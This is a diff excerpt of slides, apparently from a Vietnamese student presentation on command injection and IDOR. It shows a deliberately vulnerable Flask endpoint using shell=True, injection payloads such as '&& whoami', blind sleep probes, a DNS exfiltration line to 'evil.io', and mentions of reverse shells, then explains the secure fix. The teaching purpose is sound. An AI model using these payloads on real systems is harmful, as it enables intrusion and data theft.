+                <span class="w-3 h-3 rounded-full bg-amber-400/80"></span>
+                <span class="w-3 h-3 rounded-full bg-emerald-500/80"></span>
+                <span class="ml-2 px-2.5 py-0.5 rounded bg-slate-800 border border-slate-700 font-mono text-xs text-sky-300">network_tools.py</span>
+              </div>
+              <span class="px-2.5 py-0.5 rounded-full bg-red-500/20 border border-red-500/40 text-red-300 text-[11px] font-bold">shell=True</span>
+            </div>
+
+            <div class="p-4 sm:p-5 font-mono text-xs sm:text-[13px] leading-6 overflow-x-auto flex-1 flex flex-col justify-between">
+              <div class="space-y-0.5">
+                <div class="flex gap-3 px-2"><span class="text-slate-600 select-none w-5 text-right">1</span><span><span class="tok-dec">@app.route</span>(<span class="tok-str">'/api/ping'</span>, methods=[<span class="tok-str">'POST'</span>])</span></div>
+                <div class="flex gap-3 px-2"><span class="text-slate-600 select-none w-5 text-right">2</span><span><span class="tok-kw">def</span> <span class="tok-fn">ping_host</span>():</span></div>
+                <div class="flex gap-3 px-2"><span class="text-slate-600 select-none w-5 text-right">3</span><span class="pl-4">host = request.json.get(<span class="tok-str">'host'</span>)</span></div>
+                <div class="flex gap-3 px-2"><span class="text-slate-600 select-none w-5 text-right">4</span><span class="pl-4 tok-cmt"># [LỖ HỔNG COMMAND INJECTION]: Nối chuỗi trực tiếp vào lệnh hệ thống</span></div>
+                <div class="flex gap-3 px-2"><span class="text-slate-600 select-none w-5 text-right">5</span><span class="pl-4 tok-cmt"># và bật shell=True cho phép thực thi các toán tử nối lệnh (&amp;&amp;, ;, |)</span></div>
+                <!-- RED HIGHLIGHTED LINE -->
+                <div class="flex gap-3 px-2 py-2 my-1.5 bg-red-500/25 border-l-4 border-red-500 rounded-r-md">
+                  <span class="text-red-400 font-bold select-none w-5 text-right">6</span>
+                  <span class="pl-4 text-white font-semibold">output = subprocess.check_output(<span class="tok-str">f"ping -n 2 {<span class="text-red-300 underline decoration-red-400">host</span>}"</span>, <span class="px-1.5 py-0.5 rounded bg-red-600 text-white font-bold">shell=True</span>)</span>
+                </div>
+                <div class="flex gap-3 px-2"><span class="text-slate-600 select-none w-5 text-right">7</span><span class="pl-4"><span class="tok-kw">return</span> jsonify({<span class="tok-str">"result"</span>: output})</span></div>
+              </div>
+
+              <!-- 2 Fatal Causes -->
+              <div class="mt-4 pt-4 border-t border-slate-800 grid grid-cols-1 sm:grid-cols-2 gap-3 font-sans">
+                <div class="bg-red-500/10 border border-red-500/35 rounded-xl p-3">
+                  <div class="text-xs font-bold text-red-300 mb-1">1. Nối chuỗi trực tiếp</div>
+                  <p class="text-[11px] text-slate-300">Input <code class="text-amber-300">host</code> hòa lẫn vào chuỗi lệnh, không phân biệt <em>Dữ liệu</em> với <em>Mã lệnh</em>.</p>
+                </div>
+                <div class="bg-red-500/10 border border-red-500/35 rounded-xl p-3">
+                  <div class="text-xs font-bold text-red-300 mb-1">2. Bật <code class="font-mono">shell=True</code></div>
+                  <p class="text-[11px] text-slate-300">Kích hoạt trình thông dịch Shell (<code class="text-amber-300">cmd.exe / sh</code>) phân tích ký tự nối lệnh.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right: OS Shell Command Anatomy -->
+          <div class="lg:col-span-6 bg-slate-800/90 border border-slate-700 rounded-2xl p-5 shadow-2xl flex flex-col justify-between">
+            <div class="flex items-center justify-between pb-3 border-b border-slate-700">
+              <div class="flex items-center gap-2">
+                <i data-lucide="cpu" class="w-5 h-5 text-red-400"></i>
+                <span class="font-bold text-sm text-white uppercase tracking-wide">Giải phẫu chuỗi lệnh tại OS Shell</span>
+              </div>
+              <span class="font-mono text-[11px] text-slate-400">cmd.exe /c | /bin/sh -c</span>
+            </div>
+
+            <!-- Step 1: Attacker Input -->
+            <div class="my-3 space-y-3">
+              <div>
+                <div class="text-[11px] uppercase tracking-wider text-slate-400 font-semibold mb-1.5">Bước 1: Payload kẻ tấn công gửi vào <code class="text-sky-300">host</code></div>
+                <div class="bg-slate-950 border border-slate-700 rounded-xl px-4 py-2.5 font-mono text-sm flex items-center gap-2">
+                  <span class="text-slate-500">"host":</span>
+                  <span class="text-emerald-300">"127.0.0.1</span>
+                  <span class="px-2 py-0.5 rounded bg-red-600 text-white font-extrabold">&amp;&amp;</span>
+                  <span class="text-red-300 font-bold">whoami"</span>
+                </div>
+              </div>
+
+              <div class="flex justify-center text-slate-500"><i data-lucide="arrow-down" class="w-4 h-4"></i></div>
+
+              <!-- Step 2: String sent to OS Shell -->
+              <div>
+                <div class="text-[11px] uppercase tracking-wider text-slate-400 font-semibold mb-1.5">Bước 2: Chuỗi ghép hoàn chỉnh đi vào OS Shell</div>
+                <div class="bg-slate-950 border border-amber-500/40 rounded-xl p-3 font-mono text-xs sm:text-sm flex flex-wrap items-center justify-center gap-2">
+                  <span class="px-2.5 py-1 rounded bg-sky-500/20 border border-sky-500/40 text-sky-200">ping -n 2 127.0.0.1</span>
+                  <span class="px-2.5 py-1 rounded bg-red-500 text-white font-extrabold shadow">&amp;&amp;</span>
+                  <span class="px-2.5 py-1 rounded bg-red-500/25 border border-red-500 text-red-200 font-bold">whoami</span>
+                </div>
+              </div>
+
+              <!-- Split Arrows -->
+              <div class="grid grid-cols-2 gap-4 pt-1">
+                <div class="flex flex-col items-center">
+                  <i data-lucide="corner-down-left" class="w-4 h-4 text-sky-400 mb-1"></i>
+                  <div class="w-full bg-slate-900 border border-sky-500/40 rounded-xl p-3">
+                    <div class="text-[11px] font-bold text-sky-400 uppercase mb-1">Lệnh #1 (Hợp lệ)</div>
+                    <div class="font-mono text-xs text-white bg-slate-950 px-2 py-1 rounded mb-1.5">ping -n 2 127.0.0.1</div>
+                    <div class="font-mono text-[11px] text-slate-400">→ Reply from 127.0.0.1: time&lt;1ms</div>
+                  </div>
+                </div>
+
+                <div class="flex flex-col items-center">
+                  <i data-lucide="corner-down-right" class="w-4 h-4 text-red-400 mb-1"></i>
+                  <div class="w-full bg-red-500/15 border-2 border-red-500 rounded-xl p-3">
+                    <div class="text-[11px] font-bold text-red-300 uppercase mb-1">Lệnh #2 (Chèn trái phép!)</div>
+                    <div class="font-mono text-xs text-white bg-slate-950 px-2 py-1 rounded mb-1.5 font-bold">whoami</div>
+                    <div class="font-mono text-[11px] text-red-300 font-bold">→ nt authority\system</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Shell Metacharacters Reference -->
+            <div class="pt-3 border-t border-slate-700/80 flex flex-wrap items-center justify-between gap-2 text-xs">
+              <span class="text-slate-400 font-semibold">Toán tử nối lệnh nguy hiểm:</span>
+              <div class="flex items-center gap-1.5 font-mono">
+                <span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold">&amp;&amp;</span>
+                <span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold">;</span>
+                <span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold">|</span>
+                <span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold">||</span>
+                <span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold">$(...)</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 9: COMMAND INJECTION - KỊCH BẢN TẤN CÔNG & BURP REPEATER DEMO -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="9" data-section="Phần 2: Command Injection" data-theme="danger" data-title="Command Injection — Kịch bản tấn công thực tế & Demo">
+        <div class="mb-5">
+          <div class="text-xs font-bold uppercase tracking-wider text-red-400 mb-1">Real-world Exploitation &amp; Live Demo</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Command Injection — Kịch Bản Thực Chiến &amp; Burp Repeater</h2>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch">
+          <!-- Left: 3 Real-World Scenarios -->
+          <div class="lg:col-span-5 flex flex-col justify-between gap-3.5">
+            <!-- 1. Classic / In-band -->
+            <div class="bg-red-500/10 border border-red-500/45 rounded-2xl p-4 shadow-lg">
+              <div class="flex items-center justify-between mb-1.5">
+                <h3 class="text-sm font-bold text-white flex items-center gap-2">
+                  <span class="w-6 h-6 rounded-md bg-red-500 text-white flex items-center justify-center font-mono text-xs font-bold">1</span>
+                  Classic / In-band Injection
+                </h3>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40">TRỰC TIẾP</span>
+              </div>
+              <p class="text-xs text-slate-200 leading-relaxed mb-2">
+                Kết quả thực thi lệnh hệ thống in thẳng ra phản hồi HTTP / giao diện web.
+              </p>
+              <div class="font-mono text-[11px] bg-slate-950 px-2.5 py-1.5 rounded border border-slate-800 text-red-300">
+                127.0.0.1 &amp;&amp; whoami &nbsp;|&nbsp; &amp;&amp; type system_info.txt
+              </div>
+            </div>
+
+            <!-- 2. Blind Command Injection -->
+            <div class="bg-slate-800/90 border border-slate-700 rounded-2xl p-4 shadow-lg">
+              <div class="flex items-center justify-between mb-1.5">
+                <h3 class="text-sm font-bold text-white flex items-center gap-2">
+                  <span class="w-6 h-6 rounded-md bg-amber-500/20 text-amber-400 flex items-center justify-center font-mono text-xs font-bold">2</span>
+                  Blind Command Injection
+                </h3>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/15 text-amber-300 border border-amber-500/30">TIME / OOB DNS</span>
+              </div>
+              <p class="text-xs text-slate-300 leading-relaxed mb-2">
+                Ứng dụng không trả về output → Đo thời gian trễ hoặc tuồn dữ liệu ra ngoài qua truy vấn DNS.
+              </p>
+              <div class="font-mono text-[11px] bg-slate-950 px-2.5 py-1.5 rounded border border-slate-800 text-amber-300">
+                &amp;&amp; timeout 10 &nbsp;/&nbsp; ; sleep 10 &nbsp;/&nbsp; nslookup $(whoami).evil.io
+              </div>
+            </div>
+
+            <!-- 3. Reverse Shell & Pivoting -->
+            <div class="bg-slate-800/90 border border-slate-700 rounded-2xl p-4 shadow-lg">
+              <div class="flex items-center justify-between mb-1.5">
+                <h3 class="text-sm font-bold text-white flex items-center gap-2">
+                  <span class="w-6 h-6 rounded-md bg-purple-500/20 text-purple-300 flex items-center justify-center font-mono text-xs font-bold">3</span>
+                  Reverse Shell &amp; Pivoting
+                </h3>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30">POST-EXPLOIT</span>
+              </div>
+              <p class="text-xs text-slate-300 leading-relaxed">
+                Mở kết nối dòng lệnh ngược về máy attacker (<code class="text-purple-300">nc / PowerShell</code>), biến Web Server thành bàn đạp xâm nhập mạng nội bộ (Lateral Movement).
+              </p>
+            </div>
+          </div>
+
+          <!-- Right: Burp Repeater Dual-Pane Simulation -->
+          <div class="lg:col-span-7 bg-[#0d1117] border border-slate-700 rounded-2xl overflow-hidden shadow-2xl flex flex-col">
+            <!-- Burp Repeater Header -->
+            <div class="bg-slate-900 px-4 py-2.5 border-b border-slate-700 flex items-center justify-between">
+              <div class="flex items-center gap-2.5">
+                <div class="w-6 h-6 rounded bg-orange-500/20 border border-orange-500/50 text-orange-400 flex items-center justify-center">
+                  <i data-lucide="send" class="w-3.5 h-3.5"></i>
+                </div>
+                <span class="text-xs font-bold text-white">Burp Suite Repeater — Live Exploit Demo</span>
+              </div>
+              <button onclick="sendRepeaterDemo()" id="btnRepeaterSend" class="px-3.5 py-1 rounded-md bg-orange-500 hover:bg-orange-600 text-white text-xs font-bold flex items-center gap-1.5 transition shadow">
+                <i data-lucide="play" class="w-3 h-3"></i> Send Request
+              </button>
+            </div>
+
+            <!-- Request Pane -->
+            <div class="p-4 border-b border-slate-800 bg-slate-950/70">
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-[11px] font-bold uppercase tracking-wider text-sky-400">Request</span>
+                <span class="text-[11px] font-mono text-slate-500">HTTP/1.1 • Target: corpdrive.local:443</span>
+              </div>
+              <pre class="font-mono text-xs leading-5 text-slate-300 overflow-x-auto"><span class="text-amber-300 font-bold">POST</span> /api/ping HTTP/1.1
+Host: corpdrive.local
+Content-Type: application/json
+Cookie: session=eyJ1c2VyX2lkIjoxfQ...
+
+{
+  <span class="text-sky-300">"host"</span>: <span class="text-emerald-300">"127.0.0.1 <span class="bg-red-500/30 border border-red-500 text-red-200 px-1.5 py-0.5 rounded font-bold">&amp;&amp; type system_info.txt</span>"</span>
+}</pre>
+            </div>
+
+            <!-- Response Pane -->
+            <div id="repeaterResponsePane" class="p-4 flex-1 bg-[#0b101a] flex flex-col justify-between transition-opacity duration-300">
+              <div>
+                <div class="flex items-center justify-between mb-2">
+                  <span class="text-[11px] font-bold uppercase tracking-wider text-red-400 flex items-center gap-1.5">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5"></i> Response
+                  </span>
+                  <span id="repeaterStatus" class="text-[11px] font-mono px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold">200 OK • 482 bytes</span>
+                </div>
+                <pre class="font-mono text-xs leading-5 text-slate-300 overflow-x-auto">HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "result": "Pinging 127.0.0.1 with 32 bytes of data:\nReply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128\n\n--- [system_info.txt OUTPUT] ---\nHost: CORP-PROD-WEB01 | Privilege: SYSTEM\n<span class="inline-block mt-1 px-2.5 py-1 rounded-md bg-red-500/25 border border-red-500 text-amber-300 font-extrabold shadow">FLAG{OS_C0mm4nd_Inj3ct10n_D3m0_2026}</span>"
+}</pre>
+              </div>
+
+              <div class="mt-3 pt-2.5 border-t border-slate-800 flex items-center gap-2 text-xs text-red-300">
+                <i data-lucide="flame" class="w-4 h-4 text-red-400 shrink-0"></i>
+                <span>File bí mật trên máy chủ đã bị đọc hoàn toàn qua tham số JSON <code class="font-mono text-white">host</code>!</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 10: COMMAND INJECTION - GIẢI PHÁP PHÒNG CHỐNG & CODE AN TOÀN  -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="10" data-section="Phần 2: Command Injection • Phòng thủ" data-theme="safe" data-title="Command Injection — Giải pháp Phòng chống & Code An Toàn">
+        <div class="mb-4">
+          <div class="text-xs font-bold uppercase tracking-wider text-emerald-400 mb-1">Defense-in-Depth &amp; Secure Coding</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Command Injection — Đối Chiếu Code Lỗi &amp; Code An Toàn</h2>
+        </div>
+
+        <!-- Before vs After Code -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-5 mb-5">
+          <!-- VULNERABLE -->
+          <div class="bg-[#0d1117] border border-red-500/45 rounded-2xl overflow-hidden shadow-xl flex flex-col">
+            <div class="bg-red-500/15 px-4 py-2.5 border-b border-red-500/35 flex items-center justify-between">
+              <div class="flex items-center gap-2 text-red-300 font-bold text-xs uppercase">
+                <i data-lucide="x-octagon" class="w-4 h-4"></i> Vulnerable Code (Đỏ)
+              </div>
+              <span class="font-mono text-[11px] text-red-300">Nối chuỗi + shell=True</span>
+            </div>
+            <div class="p-4 font-mono text-xs leading-6 overflow-x-auto flex-1 flex flex-col justify-between">
+              <div>
+                <div><span class="tok-kw">def</span> <span class="tok-fn">ping_host</span>():</div>
+                <div class="pl-4">host = request.json.get(<span class="tok-str">'host'</span>)</div>
+                <div class="pl-4 tok-cmt"># Không kiểm tra định dạng host!</div>
+                <div class="pl-4 my-1.5 py-1.5 px-2 bg-red-500/20 border-l-4 border-red-500 rounded-r text-red-100 font-semibold">
+                  subprocess.check_output(<span class="tok-str">f"ping -n 2 {host}"</span>, shell=<span class="tok-num">True</span>)
+                </div>
+              </div>
+              <div class="mt-3 pt-2.5 border-t border-slate-800 text-[11px] text-red-300 font-sans flex items-center gap-1.5">
+                <i data-lucide="alert-triangle" class="w-3.5 h-3.5 shrink-0"></i>
+                OS Shell thông dịch mọi ký tự <code class="font-mono">&amp;&amp; ; |</code> thành lệnh hệ điều hành mới.
+              </div>
+            </div>
+          </div>
+
+          <!-- SECURE -->
+          <div class="bg-[#0d1117] border border-emerald-500/55 rounded-2xl overflow-hidden shadow-xl glow-safe flex flex-col">
+            <div class="bg-emerald-500/15 px-4 py-2.5 border-b border-emerald-500/35 flex items-center justify-between">
+              <div class="flex items-center gap-2 text-emerald-300 font-bold text-xs uppercase">
+                <i data-lucide="shield-check" class="w-4 h-4"></i> Secure Code (Xanh lá)
+              </div>
+              <span class="font-mono text-[11px] text-emerald-300">Allowlist + shell=False</span>
+            </div>
+            <div class="p-4 font-mono text-xs leading-6 overflow-x-auto flex-1 flex flex-col justify-between">
+              <div>
+                <div class="tok-cmt"># 1. Allowlist Validation (Chỉ chấp nhận IP/Hostname chuẩn)</div>
+                <div class="my-1 py-1 px-2 bg-emerald-500/15 border-l-4 border-emerald-400 rounded-r text-emerald-100 font-semibold">
+                  <span class="tok-kw">if not</span> re.match(<span class="tok-str">r'^[a-zA-Z0-9.-]{1,253}$'</span>, host):<br/>
+                  &nbsp;&nbsp;&nbsp;&nbsp;abort(<span class="tok-num">400</span>)
+                </div>
+                <div class="tok-cmt mt-2"># 2. Tắt shell=False và truyền tham số dạng mảng tách biệt</div>
+                <div class="my-1 py-1 px-2 bg-emerald-500/20 border-l-4 border-emerald-400 rounded-r text-emerald-100 font-semibold">
+                  subprocess.run([<span class="tok-str">"ping"</span>, <span class="tok-str">"-n"</span>, <span class="tok-str">"2"</span>, host], <span class="px-1.5 py-0.5 rounded bg-emerald-600 text-white font-bold">shell=False</span>)
+                </div>
+              </div>
+              <div class="mt-2 pt-2 border-t border-slate-800 text-[11px] text-emerald-300 font-sans flex items-center gap-1.5">
+                <i data-lucide="check-circle" class="w-3.5 h-3.5 shrink-0"></i>
+                OS gọi thẳng binary <code class="font-mono">ping</code>; chuỗi <code class="font-mono">host</code> chỉ là tham số thuần, vô hiệu hóa hoàn toàn metacharacters.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3 Golden Defense Principles -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+          <div class="bg-slate-800/90 border border-emerald-500/35 rounded-xl p-4">
+            <div class="flex items-center gap-2.5 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center"><i data-lucide="terminal" class="w-4 h-4"></i></div>
+              <h4 class="text-sm font-bold text-white">1. Tắt Shell (<code class="font-mono text-emerald-300">shell=False</code>)</h4>
+            </div>
+            <p class="text-xs text-slate-300 leading-relaxed">
+              Không gọi trình thông dịch Shell. Truyền đối số dạng mảng tách biệt (hoặc ưu tiên dùng thư viện native thay vì gọi lệnh OS).
+            </p>
+          </div>
+
+          <div class="bg-slate-800/90 border border-emerald-500/35 rounded-xl p-4">
+            <div class="flex items-center gap-2.5 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center"><i data-lucide="filter" class="w-4 h-4"></i></div>
+              <h4 class="text-sm font-bold text-white">2. Allowlist Validation phía Server</h4>
+            </div>
+            <p class="text-xs text-slate-300 leading-relaxed">
+              Dùng <strong>Danh sách trắng (Allowlist)</strong> kiểm tra chặt kiểu dữ liệu (IP/Domain). Không dùng Blacklist vì rất dễ bị qua mặt (bypass).
+            </p>
+          </div>
+
+          <div class="bg-slate-800/90 border border-emerald-500/35 rounded-xl p-4">
+            <div class="flex items-center gap-2.5 mb-2">
+              <div class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center"><i data-lucide="user-minus" class="w-4 h-4"></i></div>
+              <h4 class="text-sm font-bold text-white">3. Nguyên tắc Least Privilege</h4>
+            </div>
+            <p class="text-xs text-slate-300 leading-relaxed">
+              Tuyệt đối <strong>không</strong> chạy Web Server bằng quyền <code class="text-red-300">root</code> / <code class="text-red-300">Administrator</code>. Cách ly tiến trình bằng tài khoản đặc quyền tối thiểu / Container.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 11: TỔNG HỢP ĐỐI CHIẾU NHANH (COMPARISON MATRIX)              -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="11" data-section="Tổng hợp & Đối chiếu" data-theme="sky" data-title="Tổng hợp Đối chiếu Nhanh (Comparison Matrix)">
+        <div class="mb-5">
+          <div class="text-xs font-bold uppercase tracking-wider text-sky-400 mb-1">Comparison Matrix</div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Tổng Hợp Đối Chiếu Nhanh: IDOR vs. OS Command Injection</h2>
+        </div>
+
+        <div class="bg-slate-800/90 border border-slate-700 rounded-2xl overflow-hidden shadow-2xl">
+          <div class="overflow-x-auto">
+            <table class="w-full text-left border-collapse">
+              <thead>
+                <tr class="bg-slate-900 border-b border-slate-700">
+                  <th class="py-3.5 px-5 text-xs font-bold uppercase tracking-wider text-slate-400 w-1/5">Tiêu chí so sánh</th>
+                  <th class="py-3.5 px-5 text-sm font-extrabold text-white w-2/5 border-l border-slate-800">
+                    <div class="flex items-center gap-2">
+                      <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                      IDOR (Insecure Direct Object References)
+                    </div>
+                  </th>
+                  <th class="py-3.5 px-5 text-sm font-extrabold text-white w-2/5 border-l border-slate-800">
+                    <div class="flex items-center gap-2">
+                      <span class="w-2.5 h-2.5 rounded-full bg-amber-400"></span>
+                      OS Command Injection
+                    </div>
+                  </th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-700/70 text-xs sm:text-sm">
+                <!-- Row 1: OWASP 2025 -->
+                <tr class="hover:bg-slate-800/60 transition">
+                  <td class="py-3.5 px-5 font-bold text-slate-200 bg-slate-900/40">
+                    <div class="flex items-center gap-2"><i data-lucide="award" class="w-4 h-4 text-sky-400"></i> Phân loại OWASP 2025</div>
+                  </td>
+                  <td class="py-3.5 px-5 border-l border-slate-800">
+                    <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-red-500/20 text-red-300 border border-red-500/40 font-mono text-xs font-bold">
+                      A01:2025 – Broken Access Control (Top 1)
+                    </span>
+                  </td>
+                  <td class="py-3.5 px-5 border-l border-slate-800">
+                    <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-amber-500/20 text-amber-300 border border-amber-500/40 font-mono text-xs font-bold">
+                      A05:2025 – Injection (Top 5)
+                    </span>
+                  </td>
+                </tr>
+
+                <!-- Row 2: Bản chất lỗi -->
+                <tr class="hover:bg-slate-800/60 transition">
+                  <td class="py-3.5 px-5 font-bold text-slate-200 bg-slate-900/40">
+                    <div class="flex items-center gap-2"><i data-lucide="code-2" class="w-4 h-4 text-sky-400"></i> Bản chất lỗi</div>
+                  </td>
+                  <td class="py-3.5 px-5 text-slate-300 border-l border-slate-800">
+                    Thiếu kiểm tra <strong class="text-white">Object-Level Authorization</strong>; tin tưởng ID đối tượng từ client mà không đối chiếu <code class="text-red-300">session['user_id']</code>.
+                  </td>
+                  <td class="py-3.5 px-5 text-slate-300 border-l border-slate-800">
+                    Nối trực tiếp đầu vào chưa lọc vào chuỗi lệnh OS kèm <code class="text-red-300">shell=True</code>, làm mờ ranh giới giữa <em>Dữ liệu</em> và <em>Lệnh</em>.
+                  </td>
+                </tr>
+
+                <!-- Row 3: Công cụ khai thác -->
+                <tr class="hover:bg-slate-800/60 transition">
+                  <td class="py-3.5 px-5 font-bold text-slate-200 bg-slate-900/40">
+                    <div class="flex items-center gap-2"><i data-lucide="wrench" class="w-4 h-4 text-sky-400"></i> Công cụ khai thác</div>
+                  </td>
+                  <td class="py-3.5 px-5 text-slate-300 border-l border-slate-800">
+                    Trình duyệt (URL), Chrome DevTools (<kbd class="px-1.5 py-0.5 rounded bg-slate-900 border border-slate-700 font-mono text-[11px]">F12</kbd>), <strong>Burp Suite Intruder</strong> (quét dải số ID).
+                  </td>
+                  <td class="py-3.5 px-5 text-slate-300 border-l border-slate-800">
+                    <strong>Burp Suite Repeater</strong>, toán tử Shell (<code class="text-amber-300">&amp;&amp; ; |</code>), Blind Sleep/DNS, Netcat / Reverse Shell.
+                  </td>
+                </tr>
+
+                <!-- Row 4: Mức độ ảnh hưởng CIA -->
+                <tr class="hover:bg-slate-800/60 transition">
+                  <td class="py-3.5 px-5 font-bold text-slate-200 bg-slate-900/40">
+                    <div class="flex items-center gap-2"><i data-lucide="shield-alert" class="w-4 h-4 text-sky-400"></i> Mức độ ảnh hưởng CIA</div>
+                  </td>
+                  <td class="py-3.5 px-5 text-slate-300 border-l border-slate-800">
+                    <span class="text-red-300 font-bold">Confidentiality &amp; Integrity:</span> Rò rỉ/sửa dữ liệu người dùng diện rộng, chiếm quyền tài khoản (Account Takeover).
+                  </td>
+                  <td class="py-3.5 px-5 text-slate-300 border-l border-slate-800">
+                    <span class="text-red-400 font-extrabold">Toàn bộ tam giác CIA (RCE):</span> Thực thi mã từ xa, chiếm quyền máy chủ, làm bàn đạp tấn công mạng nội bộ.
+                  </td>
+                </tr>
+
+                <!-- Row 5: Biện pháp phòng thủ cốt lõi -->
+                <tr class="hover:bg-slate-800/60 transition">
+                  <td class="py-3.5 px-5 font-bold text-slate-200 bg-slate-900/40">
+                    <div class="flex items-center gap-2"><i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i> Phòng thủ cốt lõi</div>
+                  </td>
+                  <td class="py-3.5 px-5 border-l border-slate-800">
+                    <div class="text-emerald-300 font-semibold">Complete Mediation + UUIDv4</div>
+                    <div class="text-xs text-slate-300 mt-0.5">Truy vấn kèm <code class="text-emerald-300">AND owner_id = session['user_id']</code>, trả <code class="text-emerald-300">403</code> &amp; ghi Audit Log.</div>
+                  </td>
+                  <td class="py-3.5 px-5 border-l border-slate-800">
+                    <div class="text-emerald-300 font-semibold">shell=False + Allowlist + Least Privilege</div>
+                    <div class="text-xs text-slate-300 mt-0.5">Truyền tham số dạng mảng, lọc Regex nghiêm ngặt, không chạy Web Server bằng <code class="text-emerald-300">root/Admin</code>.</div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- SLIDE 12: TỔNG KẾT & Q&A                                            -->
+      <!-- =================================================================== -->
+      <section class="slide flex-col justify-center min-h-[72vh]" data-slide="12" data-section="Tổng kết & Q&A" data-theme="safe" data-title="Tổng kết & Q&A">
+        <div class="max-w-4xl mx-auto text-center space-y-7">
+          <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/15 border border-emerald-500/40 text-emerald-300 text-xs font-bold uppercase tracking-widest">
+            <i data-lucide="shield-check" class="w-4 h-4"></i>
+            <span>Thông điệp cốt lõi — Core Security Principle</span>
+          </div>
+
+          <!-- Hero Quote Box -->
+          <div class="bg-gradient-to-br from-slate-800/95 via-slate-900 to-slate-800/95 border-2 border-emerald-500/45 rounded-3xl p-7 sm:p-10 shadow-2xl relative overflow-hidden">
+            <div class="absolute -top-12 -right-12 w-40 h-40 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>
+            <div class="absolute -bottom-12 -left-12 w-40 h-40 bg-sky-500/10 rounded-full blur-2xl pointer-events-none"></div>
+
+            <i data-lucide="quote" class="w-9 h-9 text-emerald-400/50 mx-auto mb-4"></i>
+            <blockquote class="text-2xl sm:text-3xl lg:text-4xl font-extrabold leading-snug text-white tracking-tight">
+              &ldquo;Never Trust User Input —
+              <span class="bg-gradient-to-r from-emerald-400 to-sky-400 bg-clip-text text-transparent">
+                Đặt chốt kiểm soát tại mọi Ranh giới tin cậy (Trust Boundary)
+              </span>&rdquo;
+            </blockquote>
+
+            <!-- 2 Quick Takeaways -->
+            <div class="mt-7 grid grid-cols-1 sm:grid-cols-2 gap-4 text-left">
+              <div class="bg-slate-950/80 border border-slate-700 rounded-xl p-4 flex items-start gap-3">
+                <div class="w-8 h-8 rounded-lg bg-red-500/15 text-red-400 flex items-center justify-center shrink-0"><i data-lucide="lock" class="w-4 h-4"></i></div>
+                <div>
+                  <div class="text-xs font-bold text-white uppercase">Với IDOR (A01:2025)</div>
+                  <p class="text-xs text-slate-400 mt-0.5">Luôn xác minh quyền sở hữu tài nguyên dựa trên Session ở phía Server.</p>
+                </div>
+              </div>
+              <div class="bg-slate-950/80 border border-slate-700 rounded-xl p-4 flex items-start gap-3">
+                <div class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center shrink-0"><i data-lucide="terminal" class="w-4 h-4"></i></div>
+                <div>
+                  <div class="text-xs font-bold text-white uppercase">Với Command Injection (A05:2025)</div>
+                  <p class="text-xs text-slate-400 mt-0.5">Tách biệt hoàn toàn dữ liệu khỏi lệnh hệ thống bằng <code class="text-emerald-300">shell=False</code> &amp; Allowlist.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Q&A & Thank You Card -->
+          <div class="bg-slate-800/80 border border-slate-700 rounded-2xl p-6 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div class="flex items-center gap-4 text-left">
+              <div class="w-12 h-12 rounded-2xl bg-sky-500/15 border border-sky-500/35 text-sky-400 flex items-center justify-center shrink-0">
+                <i data-lucide="message-circle-question" class="w-6 h-6"></i>
+              </div>
+              <div>
+                <h3 class="text-lg font-extrabold text-white">Q&amp;A — Hỏi Đáp &amp; Thảo Luận</h3>
+                <p class="text-sm text-slate-300">Cảm ơn Thầy/Cô và các bạn đã chú ý lắng nghe bài trình bày của nhóm!</p>
+              </div>
